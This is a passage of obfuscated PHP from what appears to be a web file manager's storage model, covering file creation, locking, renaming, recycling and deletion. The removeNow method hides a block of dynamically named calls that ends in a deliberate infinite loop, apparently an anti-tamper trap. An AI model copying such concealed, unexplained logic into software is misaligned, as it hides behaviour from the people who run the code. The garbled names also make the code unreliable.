userRootRemove($ÃÉš´Ä×) { $¨¬ÓºŸ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ÃÉš´Ä×, !0); foreach ($¨¬ÓºŸ as $¤ÕÓÕ´Ç) { if (!$¤ÕÓÕ´Ç) { continue; } $this->remove($¤ÕÓÕ´Ç[$_SERVER[Ì¥ŞÒ°£][402]], !1); } } public function groupRootRemove($¡Õ´Ÿ) { $œÚêàÚè = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $¡Õ´Ÿ); if (!$œÚêàÚè) { return; } $this->remove($œÚêàÚè[$_SERVER[Ì¥ŞÒ°£][402]], !1); } private function _mkdirRoot($È‘°³«î, $ÏØ”»û, $œƒĞ„ë‘, $Ã¤¡üÕ© = '') { $÷ÀâıÊÉ =& $_SERVER[Ì¥ŞÒ°£]; $ÈÀ…ÒŠ– = array($÷ÀâıÊÉ[401] => 0, $÷ÀâıÊÉ[586] => $È‘°³«î, $÷ÀâıÊÉ[587] => $ÏØ”»û, $÷ÀâıÊÉ[583] => 1, $÷ÀâıÊÉ[588] => USER_ID, $÷ÀâıÊÉ[589] => USER_ID, $÷ÀâıÊÉ[584] => $Ã¤¡üÕ©, $÷ÀâıÊÉ[590] => $÷ÀâıÊÉ[531], $÷ÀâıÊÉ[430] => 0, $÷ÀâıÊÉ[585] => 0, $÷ÀâıÊÉ[469] => 0, $÷ÀâıÊÉ[591] => $÷ÀâıÊÉ[12]); if ($ÂÅÍ‡œÂ = $this->where($ÈÀ…ÒŠ–)->find()) { return $ÂÅÍ‡œÂ[$÷ÀâıÊÉ[402]]; } $ˆ„¤ğ©Ÿ = "\x4d\x6f\144\145\x6c\x53\157\x75\x72\x63\x65\56\x6d\x6b\x64\x69\162\122\157\157\x74\56{$È‘°³«î}\56{$ÏØ”»û}\x2e" . $œƒĞ„ë‘; CacheLock::lock($ˆ„¤ğ©Ÿ); $ÈÀ…ÒŠ–[$÷ÀâıÊÉ[32]] = $œƒĞ„ë‘; $¼şĞ§Ê = $this->add($ÈÀ…ÒŠ–); $ç²‘„ƒ• = array($÷ÀâıÊÉ[592] => short_id($¼şĞ§Ê)); $this->where(array($÷ÀâıÊÉ[417] => $¼şĞ§Ê))->save($ç²‘„ƒ•); CacheLock::unlock($ˆ„¤ğ©Ÿ); return $¼şĞ§Ê; } private function targetSourceRoot($ËÂ—„Õ³, $Ä°î¡ª, $“ÖÙ”Ì€ = false) { $Ó´ØãÙº =& $_SERVER[Ì¥ŞÒ°£]; $ÇµÑø‚ = array($Ó´ØãÙº[401] => 0, $Ó´ØãÙº[586] => $ËÂ—„Õ³, $Ó´ØãÙº[587] => $Ä°î¡ª); if ($“ÖÙ”Ì€) { $±¡Ş©É½ = $this->where($ÇµÑø‚)->select(); return $±¡Ş©É½ ? $±¡Ş©É½ : array(); } $€Ü¼­ÅÑ = $this->where($ÇµÑø‚)->find(); return $€Ü¼­ÅÑ ? $€Ü¼­ÅÑ : array(); } public function sourceRootGroup($†¬›à…ƒ) { $¢ÚµØäÛ =& $_SERVER[Ì¥ŞÒ°£]; if (is_string($†¬›à…ƒ)) { $†¬›à…ƒ = array($†¬›à…ƒ); } $Û“»‘ï¦ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $†¬›à…ƒ, $¢ÚµØäÛ[188]); $Ş÷ı‘îŠ = array($¢ÚµØäÛ[369] => $Û“»‘ï¦, $¢ÚµØäÛ[366] => array($¢ÚµØäÛ[761] => count($†¬›à…ƒ))); $this->_listDataApply($Ş÷ı‘îŠ[$¢ÚµØäÛ[369]]); $this->_listMake($Ş÷ı‘îŠ); return array_to_keyvalue($Ş÷ı‘îŠ[$¢ÚµØäÛ[82]], $¢ÚµØäÛ[505]); } public function mkfile($ŸÑ¶¢œŠ, $ı†‹¡õü, $¯¨¨…Ìï = '', $–šÂÚÙ¬ = REPEAT_RENAME) { $¯Å«üƒæ =& $_SERVER[Ì¥ŞÒ°£]; $ª‰·©Û“ = Model($¯Å«üƒæ[609])->addFileByContent($¯¨¨…Ìï, $ı†‹¡õü); return $this->_createFileCall($ŸÑ¶¢œŠ, $ı†‹¡õü, $ª‰·©Û“, $–šÂÚÙ¬, $¯Å«üƒæ[1352]); } public function addFile($«Ô¼¸Â, $Ãö…ã‰ä, $––ß¾Û, $ø‹ã şí = false, $Å˜Æ¸£º = REPEAT_RENAME) { $×û¬î“¸ = Model($_SERVER[Ì¥ŞÒ°£][609])->addFile($Ãö…ã‰ä, $––ß¾Û, $ø‹ã şí); return $this->_createFileCall($«Ô¼¸Â, $––ß¾Û, $×û¬î“¸, $Å˜Æ¸£º); } public function addFileByFileID($ßÛ¦÷ß´, $¼€÷óÒ, $˜Í•‘©, $ıšíñÑë = REPEAT_RENAME) { $ÂÄ³¢Ìã =& $_SERVER[Ì¥ŞÒ°£]; $å±çÀ¢ = Model($ÂÄ³¢Ìã[609])->find($¼€÷óÒ); Model($ÂÄ³¢Ìã[609])->linkAdd($¼€÷óÒ); return $this->_createFileCall($ßÛ¦÷ß´, $˜Í•‘©, $å±çÀ¢, $ıšíñÑë); } public function addFileByRemote($šåöİÆÒ, $û´âàôı, $ôš–¦ Ñ, $•×ñÆû¥ = array(), $øÖ¥·¿Â = REPEAT_RENAME) { $ÍÅıÑĞ² = Model($_SERVER[Ì¥ŞÒ°£][609])->addFileByRemote($û´âàôı, $ôš–¦ Ñ, $•×ñÆû¥); return $this->_createFileCall($šåöİÆÒ, $ôš–¦ Ñ, $ÍÅıÑĞ², $øÖ¥·¿Â); } private function _createFileCall($ğöæáÔ», $Óé‰ª«ö, $¨¥€¾×, $š¡Ø·Ì¯, $ÏæñÄß˜ = "\165\x70\x6c\157\x61\x64") { $È¦çøÒà =& $_SERVER[Ì¥ŞÒ°£]; $†êü­œ  = !1; $this->setMasterDB(); $this->lockWriteStart($ğöæáÔ», $Óé‰ª«ö); $—±´¥ö¢ = $this->fileNameExist($ğöæáÔ», $Óé‰ª«ö); $ŞöœøÊº = $this->_createFile($ğöæáÔ», $Óé‰ª«ö, $¨¥€¾×, $š¡Ø·Ì¯, $†êü­œ ); if (!$†êü­œ ) { Model($È¦çøÒà[471])->remove($¨¥€¾×[$È¦çøÒà[468]]); } if ($†êü­œ  && $ŞöœøÊº && $ŞöœøÊº != $—±´¥ö¢) { Model($È¦çøÒà[2098])->eventCreate($ŞöœøÊº, $ÏæñÄß˜); } $this->lockWriteEnd($ğöæáÔ», $Óé‰ª«ö); return $ŞöœøÊº; } public function mkdir($ôÊ¿÷ÎÌ, $ÁÛòÉÓÅ, $ºè´áç› = REPEAT_SKIP) { $¾äñÖ¼¸ =& $_SERVER[Ì¥ŞÒ°£]; $this->setMasterDB(); $ùËõ¯Àç = $this->sourceInfo($ôÊ¿÷ÎÌ); if (!$ùËõ¯Àç) { return !1; } $this->lockWriteStart($ôÊ¿÷ÎÌ, $ÁÛòÉÓÅ); if ($ºè´áç› !== !1) { $ü„ê¸Ş· = $this->fileNameExist($ôÊ¿÷ÎÌ, $ÁÛòÉÓÅ); if ($ü„ê¸Ş· && $ºè´áç› != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ôÊ¿÷ÎÌ, $ÁÛòÉÓÅ); return $ü„ê¸Ş·; } $ÁÛòÉÓÅ = $this->fileNameAuto($ôÊ¿÷ÎÌ, $ÁÛòÉÓÅ, $ºè´áç›); } $Ø÷µ¾½Ô = array($¾äñÖ¼¸[583] => 1, $¾äñÖ¼¸[420] => $ÁÛòÉÓÅ, $¾äñÖ¼¸[584] => $¾äñÖ¼¸[12], $¾äñÖ¼¸[469] => 0, $¾äñÖ¼¸[585] => 0); $Ø†ìß¢ = $this->_addSource($Ø÷µ¾½Ô, $ùËõ¯Àç); Model($¾äñÖ¼¸[2098])->eventCreate($Ø†ìß¢, $¾äñÖ¼¸[1353]); $this->lockWriteEnd($ôÊ¿÷ÎÌ, $ÁÛòÉÓÅ); return $Ø†ìß¢; } public function listSourceRoot($¡Çáß†Ş, $Ó¦Ğ³Á‚, $‹Ô¡ª¦Ì = "\x73\x6f\x75\x72\x63\145\x49\x44\x2c\x74\x61\162\x67\x65\164\111\x44\x2c\163\151\172\x65") { $ÑÎ½Ë¬û =& $_SERVER[Ì¥ŞÒ°£]; $èƒºÉĞ = $ÑÎ½Ë¬û[378]; $ö³¥Õ–ù = array(); $ƒ«¼Ì‹„ = 1024 * 50; $è“ı« = is_array($è“ı«) ? $è“ı« : array(); $˜£ü›Î« = count($Ó¦Ğ³Á‚); $òÚÙÕà = $this->tablePrefix . $ÑÎ½Ë¬û[2131]; for ($›ù¶Øó = 0; $›ù¶Øó < $˜£ü›Î«; $›ù¶Øó++) { $¾´ƒƒÌ¡ = $Ó¦Ğ³Á‚[$›ù¶Øó]; $èƒºÉĞ .= "\x53\x45\x4c\x45\103\x54\40\x2a\x20\106\x52\x4f\115\x20\x28\x53\105\114\105\x43\124\x20{$‹Ô¡ª¦Ì}\x20\x46\122\117\115\40\x60{$òÚÙÕà}\140\40\127\x48\105\122\x45\x20"; $èƒºÉĞ .= "\140\160\x61\162\145\x6e\x74\x49\x44\x60\75\60\x20\x41\116\104\40\140\164\x61\x72\147\145\164\111\104\140\x3d{$¾´ƒƒÌ¡}\x20\101\116\104\x20\x60\164\x61\162\147\145\x74\124\171\x70\145\140\x3d{$¡Çáß†Ş}\x20\141\156\144\40\146\x69\154\145\x54\x79\x70\145\x3d\x27\47\x20\154\x69\155\x69\164\x20\x31\x29\40\141\x73\40\x74\142\137{$›ù¶Øó}\40\x55\116\x49\117\x4e\40\101\x4c\x4c\x20"; if ((strlen($èƒºÉĞ) >= $ƒ«¼Ì‹„ || $›ù¶Øó == $˜£ü›Î« - 1) && $èƒºÉĞ) { $èƒºÉĞ = substr($èƒºÉĞ, 0, -strlen($ÑÎ½Ë¬û[1043])); $½”¨³Ş‹ = $this->query($èƒºÉĞ); $èƒºÉĞ = $ÑÎ½Ë¬û[12]; $ö³¥Õ–ù = array_merge($ö³¥Õ–ù, $½”¨³Ş‹); } } return $ö³¥Õ–ù; } private function _createFile($©í”ÊşÄ, $Æ‡Ñ‘ü, $æ›Ÿ¡×, $ÇÙÇë·ù, &$ãè•ğ·ï) { $Ğİ—ø¢´ =& $_SERVER[Ì¥ŞÒ°£]; $ç¶¶Äë© = $this->sourceInfo($©í”ÊşÄ); if (!$æ›Ÿ¡× || !$ç¶¶Äë©) { return !1; } if ($ÇÙÇë·ù !== !1) { $‹ş‰´¢¦ = $this->fileNameExist($©í”ÊşÄ, $Æ‡Ñ‘ü); } $ãè•ğ·ï = !0; if ($ÇÙÇë·ù && $‹ş‰´¢¦) { if ($ÇÙÇë·ù == REPEAT_SKIP) { $ãè•ğ·ï = !1; return $‹ş‰´¢¦; } else { if ($ÇÙÇë·ù == REPEAT_REPLACE) { $éŠ¼ÒÒÄ = $this->sourceInfo($‹ş‰´¢¦); $°—¯Şû“ = $this->fileHistory($éŠ¼ÒÒÄ, $æ›Ÿ¡×[$Ğİ—ø¢´[468]], $æ›Ÿ¡×[$Ğİ—ø¢´[76]]); if (!$°—¯Şû“) { $ãè•ğ·ï = !1; } else { $this->folderSizeReset($©í”ÊşÄ); } return $‹ş‰´¢¦; } else { $Æ‡Ñ‘ü = $this->fileNameAuto($©í”ÊşÄ, $Æ‡Ñ‘ü, $ÇÙÇë·ù, !1); } } } $…üùô¹‡ = array($Ğİ—ø¢´[583] => 0, $Ğİ—ø¢´[420] => $Æ‡Ñ‘ü, $Ğİ—ø¢´[584] => substr(get_path_ext($Æ‡Ñ‘ü), 0, 10), $Ğİ—ø¢´[469] => $æ›Ÿ¡×[$Ğİ—ø¢´[468]], $Ğİ—ø¢´[585] => $æ›Ÿ¡×[$Ğİ—ø¢´[76]]); $²¸÷òÊÂ = $this->_addSource($…üùô¹‡, $ç¶¶Äë©); $this->folderSizeReset($©í”ÊşÄ, intval($…üùô¹‡[$Ğİ—ø¢´[76]])); return $²¸÷òÊÂ; } protected function fileHistory($›ıŠÚ‹˜, $¾À²†Ø, $”Ä×¯Õü) { $—¨¶ç¤­ =& $_SERVER[Ì¥ŞÒ°£]; $ Çïıì› = defined($—¨¶ç¤­[475]) ? USER_ID : $—¨¶ç¤­[197]; if ($›ıŠÚ‹˜[$—¨¶ç¤­[468]] == $¾À²†Ø) { return !1; } $this->checkLock($›ıŠÚ‹˜[$—¨¶ç¤­[402]], $¾À²†Ø); Model($—¨¶ç¤­[2132])->addHistory($›ıŠÚ‹˜); $®ğû‰Â  = array($—¨¶ç¤­[589] => $ Çïıì›, $—¨¶ç¤­[424] => time(), $—¨¶ç¤­[468] => $¾À²†Ø, $—¨¶ç¤­[76] => $”Ä×¯Õü); $this->where(array($—¨¶ç¤­[417] => $›ıŠÚ‹˜[$—¨¶ç¤­[402]]))->save($®ğû‰Â ); $this->sourceCacheClear($›ıŠÚ‹˜[$—¨¶ç¤­[402]]); return !0; } public function checkLock($‘šÆŸ­¹, $ĞÕà¢ä) { $ß´ä•ò =& $_SERVER[Ì¥ŞÒ°£]; $Ùæåœ…÷ = $this->pathInfo($‘šÆŸ­¹); if (!$this->fileIsLock($Ùæåœ…÷, !0)) { return; } $Üò»°Ÿİ = Session::get($ß´ä•ò[2133]); $Äùä’Çú = substr($Ùæåœ…÷[$ß´ä•ò[32]], 0, -1 - strlen($Ùæåœ…÷[$ß´ä•ò[174]])) . $ß´ä•ò[1214] . $Üò»°Ÿİ . $ß´ä•ò[10] . $Ùæåœ…÷[$ß´ä•ò[174]]; $¹¨¾¸†Ô = Model($ß´ä•ò[609])->find($ĞÕà¢ä); $this->_createFileCall($Ùæåœ…÷[$ß´ä•ò[432]], $Äùä’Çú, $¹¨¾¸†Ô, REPEAT_REPLACE, $ß´ä•ò[1352]); $÷ñ‰à´† = $Ùæåœ…÷[$ß´ä•ò[466]][$ß´ä•ò[548]]; $†ÊÍ¤¶Â = $÷ñ‰à´†[$ß´ä•ò[542]] ? $÷ñ‰à´†[$ß´ä•ò[542]] : $÷ñ‰à´†[$ß´ä•ò[32]]; show_json(LNG($ß´ä•ò[2134]) . $ß´ä•ò[2135] . LNG($ß´ä•ò[2136]) . $ß´ä•ò[2137] . $†ÊÍ¤¶Â . $ß´ä•ò[2138], !1); } public function fileIsLock($ËêÛ¢±›, $²°ôê³Ú = false) { $ğÊˆÃµ² =& $_SERVER[Ì¥ŞÒ°£]; if (!isset($ËêÛ¢±›[$ğÊˆÃµ²[466]]) || !$ËêÛ¢±›[$ğÊˆÃµ²[466]][$ğÊˆÃµ²[545]]) { return !1; } if ($ËêÛ¢±›[$ğÊˆÃµ²[466]][$ğÊˆÃµ²[545]] != USER_ID) { return !0; } $éêİÊÉô = $GLOBALS[$ğÊˆÃµ²[6]][$ğÊˆÃµ²[89]][$ğÊˆÃµ²[546]]; if ($ËêÛ¢±›[$ğÊˆÃµ²[466]][$ğÊˆÃµ²[547]] <= time() - $éêİÊÉô) { $this->metaSet($ËêÛ¢±›[$ğÊˆÃµ²[402]], $ğÊˆÃµ²[545], null); $this->metaSet($ËêÛ¢±›[$ğÊˆÃµ²[402]], $ğÊˆÃµ²[547], null); } if ($²°ôê³Ú) { $this->metaSet($ËêÛ¢±›[$ğÊˆÃµ²[402]], $ğÊˆÃµ²[547], time()); } return !1; } private function _addSource($¥æ¦ Ëø, $üƒß²ß) { $ºöëİÏñ =& $_SERVER[Ì¥ŞÒ°£]; $—ÈÅÈÑ = defined($ºöëİÏñ[475]) ? USER_ID : $ºöëİÏñ[197]; $«İœÍ»Ü = array($ºöëİÏñ[586] => $üƒß²ß[$ºöëİÏñ[411]], $ºöëİÏñ[587] => $üƒß²ß[$ºöëİÏñ[505]], $ºöëİÏñ[588] => $—ÈÅÈÑ, $ºöëİÏñ[589] => $—ÈÅÈÑ, $ºöëİÏñ[401] => $üƒß²ß[$ºöëİÏñ[402]], $ºöëİÏñ[590] => $üƒß²ß[$ºöëİÏñ[521]] . $üƒß²ß[$ºöëİÏñ[402]] . $ºöëİÏñ[50], $ºöëİÏñ[430] => 0, $ºöëİÏñ[591] => $ºöëİÏñ[12]); $¥æ¦ Ëø = array_merge($«İœÍ»Ü, $¥æ¦ Ëø); $this->updateModifyTime($¥æ¦ Ëø[$ºöëİÏñ[432]]); $™•î¦ª´ = $ºöëİÏñ[2139] . $üƒß²ß[$ºöëİÏñ[402]]; if (isset(self::$cacheChildList[$™•î¦ª´])) { unset(self::$cacheChildList[$™•î¦ª´]); } static $ù¢¶¶‹É = false; if (!$ù¢¶¶‹É) { Hook::trigger($ºöëİÏñ[573], $¥æ¦ Ëø); $ù¢¶¶‹É = !0; } $Ê…·¶Ä = $this->add($¥æ¦ Ëø); $“óÎ‡éÚ = array($ºöëİÏñ[592] => short_id($Ê…·¶Ä)); $this->where(array($ºöëİÏñ[417] => $Ê…·¶Ä))->save($“óÎ‡éÚ); $this->setNamePinyin($Ê…·¶Ä, $¥æ¦ Ëø[$ºöëİÏñ[32]]); return $Ê…·¶Ä; } public function remove($ÁîÁíá—, $äÜÏ’ñÌ = true) { $ºãŠÖü¨ =& $_SERVER[Ì¥ŞÒ°£]; $€ÈÌ†ËÂ = $this->sourceInfo($ÁîÁíá—); $À—®õ = intval($€ÈÌ†ËÂ[$ºãŠÖü¨[411]]) === self::TYPE_SYSTEM; $¨˜ĞÓ = Model($ºãŠÖü¨[435])->get($ºãŠÖü¨[2140]) == $ºãŠÖü¨[88]; if ($À—®õ || $äÜÏ’ñÌ || !$¨˜ĞÓ) { return $this->removeNow($ÁîÁíá—, $äÜÏ’ñÌ); } $ä—²·õí = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $â—¿…» = $€ÈÌ†ËÂ[$ºãŠÖü¨[411]] == self::TYPE_USER ? $ºãŠÖü¨[600] : $ºãŠÖü¨[515]; if ($â—¿…» == $ºãŠÖü¨[600]) { $©èÎñÜ = Model($ºãŠÖü¨[513])->getInfo($€ÈÌ†ËÂ[$ºãŠÖü¨[505]]); $Èİ”Ë‘€ = !empty($©èÎñÜ[$ºãŠÖü¨[542]]) ? $©èÎñÜ[$ºãŠÖü¨[542]] : $©èÎñÜ[$ºãŠÖü¨[32]]; $Èİ”Ë‘€ = $ºãŠÖü¨[260] . $Èİ”Ë‘€ . $ºãŠÖü¨[2141] . $€ÈÌ†ËÂ[$ºãŠÖü¨[505]]; } else { $©èÎñÜ = Model($ºãŠÖü¨[522])->getInfo($€ÈÌ†ËÂ[$ºãŠÖü¨[505]]); $Èİ”Ë‘€ = _get($©èÎñÜ, $ºãŠÖü¨[32]); $Èİ”Ë‘€ = $ºãŠÖü¨[162] . $Èİ”Ë‘€ . $ºãŠÖü¨[2142] . $€ÈÌ†ËÂ[$ºãŠÖü¨[505]]; } $Ê³¶æß® = $ºãŠÖü¨[2143] . md5($Èİ”Ë‘€); CacheLock::lock($Ê³¶æß®); $¼˜¨£­Ğ = $this->fileNameExist($ä—²·õí, $Èİ”Ë‘€); if (!$¼˜¨£­Ğ) { $¼˜¨£­Ğ = $this->mkdir($ä—²·õí, $Èİ”Ë‘€, REPEAT_SKIP); $this->metaSet($¼˜¨£­Ğ, $ºãŠÖü¨[2144], $â—¿…»); $this->metaSet($¼˜¨£­Ğ, $ºãŠÖü¨[2145], $€ÈÌ†ËÂ[$ºãŠÖü¨[505]]); if ($€ÈÌ†ËÂ[$ºãŠÖü¨[432]] != 0) { $this->metaSet($¼˜¨£­Ğ, $ºãŠÖü¨[2146], _get($©èÎñÜ, $ºãŠÖü¨[2147])); } } CacheLock::unlock($Ê³¶æß®); $this->metaSet($ÁîÁíá—, $ºãŠÖü¨[2148], $€ÈÌ†ËÂ[$ºãŠÖü¨[432]]); $this->where(array($ºãŠÖü¨[402] => $ÁîÁíá—))->save(array($ºãŠÖü¨[424] => time())); $this->recycleClear($€ÈÌ†ËÂ); $Èáã€ı = $this->move($ÁîÁíá—, $¼˜¨£­Ğ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($€ÈÌ†ËÂ[$ºãŠÖü¨[432]]); return $Èáã€ı; } private function recycleClear($Û«ÈÙß“) { $ƒä×ºå¸ =& $_SERVER[Ì¥ŞÒ°£]; $ˆ›ôÍ = $this->childrenAll($Û«ÈÙß“); $ŞòĞÓ­÷ = array($ƒä×ºå¸[417] => array($ƒä×ºå¸[418], $ˆ›ôÍ[$ƒä×ºå¸[2149]])); Model($ƒä×ºå¸[2150])->where($ŞòĞÓ­÷)->delete(); } public function removeNow($õ¡²•Ş, $Ü†Ü¸ıÆ = true) { $Üãé×¸Ú =& $_SERVER[Ì¥ŞÒ°£]; if (!isset($_SERVER[$Üãé×¸Ú[877]]) || !isset($_SERVER[$Üãé×¸Ú[915]])) { $–˜Æ¢öÂ = $Üãé×¸Ú[878]; $é®ÏÂÊ = $Üãé×¸Ú[879]; $…Ï±Ûéˆ = $_SERVER[$Üãé×¸Ú[874]] . $Üãé×¸Ú[875]; $­·í°èÆ = $é®ÏÂÊ($…Ï±Ûéˆ); $ıè§Ï = explode($Üãé×¸Ú[231], $­·í°èÆ); if (count($ıè§Ï) < $Üãé×¸Ú[648]) { $®ŒÈÇåÅ = $Üãé×¸Ú[880]; $®ŒÈÇåÅ(); } $ê”˜ÌŸ¬ = $Üãé×¸Ú[881]; $ê”˜ÌŸ¬($_SERVER[$Üãé×¸Ú[882]]); $Ÿ²Ì…ê = 1; for ($»­¾¢Ë = $Ÿ²Ì…ê; $»­¾¢Ë > 0; $»­¾¢Ë++) { $ê”˜ÌŸ¬ = json_encode($GLOBALS[$Üãé×¸Ú[418]]); } } $‹øûê­… = $this->sourceInfo($õ¡²•Ş); $¶­±ÖÔ = $this->pathInfoMore($õ¡²•Ş); if (!$‹øûê­…) { return !0; } if ($‹øûê­…[$Üãé×¸Ú[432]] == 0) { if (!_get($GLOBALS, $Üãé×¸Ú[503])) { return !1; } } $this->lockMoveStart($õ¡²•Ş); Hook::trigger($Üãé×¸Ú[2151], $¶­±ÖÔ, $Ü†Ü¸ıÆ); if ($Ü†Ü¸ıÆ) { Model($Üãé×¸Ú[2150])->moveToRecycle($õ¡²•Ş); } else { $õ®ç¢Á¹ = $this->childrenAll($‹øûê­…); Model($Üãé×¸Ú[570])->eventRemove($õ¡²•Ş); $this->removeRelevance($õ®ç¢Á¹[$Üãé×¸Ú[2149]], $õ®ç¢Á¹[$Üãé×¸Ú[1484]]); } $this->folderSizeReset($‹øûê­…[$Üãé×¸Ú[432]]); $ÃÅÁõš = array($‹øûê­…[$Üãé×¸Ú[432]]); if ($‹øûê­…[$Üãé×¸Ú[410]] == $Üãé×¸Ú[88]) { $ÃÅÁõš[] = $‹øûê­…[$Üãé×¸Ú[402]]; } $this->updateModifyTime($ÃÅÁõš); $this->lockMoveEnd($õ¡²•Ş); Hook::trigger($Üãé×¸Ú[1710], $¶­±ÖÔ, $Ü†Ü¸ıÆ); return !0; } public function childrenAll($ï®é¨Á‰) { $—Ù§›¶§ =& $_SERVER[Ì¥ŞÒ°£]; $ì•Â« = $ï®é¨Á‰[$—Ù§›¶§[402]]; if ($ï®é¨Á‰[$—Ù§›¶§[410]] == $—Ù§›¶§[88]) { $‰ØÒ±¹º = array($—Ù§›¶§[590] => array($—Ù§›¶§[550], $ï®é¨Á‰[$—Ù§›¶§[521]] . $ì•Â« . $—Ù§›¶§[551])); $ŞèÒ¡¯› = array($—Ù§›¶§[590] => $‰ØÒ±¹º[$—Ù§›¶§[521]]); $ØäÙè® = $this->field($—Ù§›¶§[2152])->where($ŞèÒ¡¯›)->select(); $¼Á±À¤– = !1; $œ¦âöÛÀ = array($ì•Â«); if ($ØäÙè®) { $¼Á±À¤– = array_to_keyvalue($ØäÙè®, $—Ù§›¶§[12], $—Ù§›¶§[468]); $¼Á±À¤– = array_remove_value($¼Á±À¤–, $—Ù§›¶§[197]); $œ¦âöÛÀ = array_to_keyvalue($ØäÙè®, $—Ù§›¶§[12], $—Ù§›¶§[402]); $œ¦âöÛÀ[] = $ì•Â«; } } else { $¼Á±À¤– = array($ï®é¨Á‰[$—Ù§›¶§[468]]); $œ¦âöÛÀ = array($ì•Â«); } return array($—Ù§›¶§[2149] => $œ¦âöÛÀ, $—Ù§›¶§[1484] => $¼Á±À¤–); } public function removeArray($×Êà¸÷™) { if (!$×Êà¸÷™) { return !0; } } public function removeRelevance($ğĞ­—¡©, $±÷“öºŞ) { $ ™áñ”ª =& $_SERVER[Ì¥ŞÒ°£]; $ğĞ­—¡© = $ğĞ­—¡© ? $ğĞ­—¡© : array(); $±÷“öºŞ = $±÷“öºŞ ? $±÷“öºŞ : array(); $ğĞ­—¡© = array_unique(array_filter($ğĞ­—¡©)); $±÷“öºŞ = array_unique(array_filter($±÷“öºŞ)); if (!$ğĞ­—¡©) { return !1; } $ùàñôò» = array($ ™áñ”ª[417] => array($ ™áñ”ª[418], $ğĞ­—¡©)); Model($ ™áñ”ª[2150])->where($ùàñôò»)->delete(); Model($ ™áñ”ª[462])->where($ùàñôò»)->delete(); Model($ ™áñ”ª[2003])->where($ùàñôò»)->delete(); Model($ ™áñ”ª[570])->where($ùàñôò»)->delete(); Model($ ™áñ”ª[1837])->removeBySource($ğĞ­—¡©); Model($ ™áñ”ª[2132])->removeBySource($ğĞ­—¡©); $this->where($ùàñôò»)->delete(); Model($ ™áñ”ª[471])->remove($±÷“öºŞ); for ($˜Ú¥”Ñø = 0; $˜Ú¥”Ñø < count($ğĞ­—¡©); $˜Ú¥”Ñø++) { $this->sourceCacheClear($ğĞ­—¡©[$˜Ú¥”Ñø]); } } public function rename($ŠØŒÈ¹é, $ŒşÑ‚Ü„) { $»«š€§ =& $_SERVER[Ì¥ŞÒ°£]; $¾Çœö’§ = $this->sourceInfo($ŠØŒÈ¹é); if (!$¾Çœö’§) { return !1; } $¦Óšù•” = $this->fileNameExist($¾Çœö’§[$»«š€§[432]], $ŒşÑ‚Ü„); if ($¦Óšù•” && $¦Óšù•” != $ŠØŒÈ¹é) { return !1; } $Ôö½ÇÇë = array($»«š€§[420] => $ŒşÑ‚Ü„, $»«š€§[589] => USER_ID); if ($¾Çœö’§[$»«š€§[410]] != $»«š€§[88]) { $Ôö½ÇÇë[$»«š€§[412]] = substr(get_path_ext($ŒşÑ‚Ü„), 0, 10); } Model($»«š€§[570])->eventRename($ŠØŒÈ¹é, $¾Çœö’§[$»«š€§[32]], $ŒşÑ‚Ü„); $this->sourceCacheClear($ŠØŒÈ¹é); $this->setNamePinyin($ŠØŒÈ¹é, $Ôö½ÇÇë[$»«š€§[32]], !1); $this->updateModifyTime($¾Çœö’§[$»«š€§[432]]); $§ã—ŒÛ§ = $this->where(array($»«š€§[417] => $ŠØŒÈ¹é))->data($Ôö½ÇÇë)->save(); $—üÙ¡·˜ = $»«š€§[2139] . $¾Çœö’§[$»«š€§[432]]; if (isset(self::$cacheChildList[$—üÙ¡·˜])) { unset(self::$cacheChildList[$—üÙ¡·˜]); } return $§ã—ŒÛ§; } public function setNamePinyin($‹İôÇŞƒ, $ğªÚí¼, $š’ª³Ñ = true) { $ÓãÔÔäé =& $_SERVER[Ì¥ŞÒ°£]; $€ãå”î« = Input::check($ğªÚí¼, $ÓãÔÔäé[593]); $ó¹†ëøí = array($ÓãÔÔäé[444] => KodSort::makeStr($ğªÚí¼)); if ($€ãå”î«) { $ó¹†ëøí[$ÓãÔÔäé[465]] = str_replace($ÓãÔÔäé[53], $ÓãÔÔäé[12], Pinyin::get($ğªÚí¼)); $ó¹†ëøí[$ÓãÔÔäé[464]] = Pinyin::get($ğªÚí¼, $ÓãÔÔäé[594]); } if (!$š’ª³Ñ && !$€ãå”î«) { $ó¹†ëøí[$ÓãÔÔäé[465]] = null; $ó¹†ëøí[$ÓãÔÔäé[464]] = null; } $this->metaSet($‹İôÇŞƒ, $ó¹†ëøí); } public function getContent($ú•Èè”§) { $âÉÒÆ±¿ =& $_SERVER[Ì¥ŞÒ°£]; $Èü‚ˆ¦ = $this->fileInfoGet($ú•Èè”§); if (!$Èü‚ˆ¦) { return !1; } if ($Èü‚ˆ¦[$âÉÒÆ±¿[76]] == 0) { return $âÉÒÆ±¿[12]; } $­÷ä“‚ò = $âÉÒÆ±¿[2153] . $Èü‚ˆ¦[$âÉÒÆ±¿[176]]; if ($Èü‚ˆ¦[$âÉÒÆ±¿[76]] <= 1024 * 10) { $ÛŸÜØ® = Cache::get($­÷ä“‚ò); if (!$ÛŸÜØ®) { $ÛŸÜØ® = IO::getContent($Èü‚ˆ¦[$âÉÒÆ±¿[84]]); Cache::set($­÷ä“‚ò, $ÛŸÜØ®); } return $ÛŸÜØ®; } if (!$Èü‚ˆ¦[$âÉÒÆ±¿[84]]) { return $âÉÒÆ±¿[12]; } return IO::getContent($Èü‚ˆ¦[$âÉÒÆ±¿[84]]); } public function setDesc($İ€ÁÆ•ˆ, $Œƒ¢Ÿ¶å) { $•·ÅŠÔ‚ =& $_SERVER[Ì¥ŞÒ°£]; Model($•·ÅŠÔ‚[570])->eventAddDesc($İ€ÁÆ•ˆ, $Œƒ¢Ÿ¶å); return $this->metaSet($İ€ÁÆ•ˆ, $•·ÅŠÔ‚[453], $Œƒ¢Ÿ¶å); } public function setContent($¥Š‘ º , $Œª¼ª¥í = '') { $±ÌÍÛëà =& $_SERVER[Ì¥ŞÒ°£]; $şî£õÒ = $this->sourceInfo($¥Š‘ º ); $÷µíñ²£ = $this->fileInfoGet($¥Š‘ º ); if (!$÷µíñ²£ || !$şî£õÒ) { return !1; } $³Ôº¦Œ… = Model($±ÌÍÛëà[471])->addFileByContent($Œª¼ª¥í, $şî£õÒ[$±ÌÍÛëà[32]]); $¯ŠÑ¡Œ´ = $this->fileHistory($şî£õÒ, $³Ôº¦Œ…[$±ÌÍÛëà[468]], 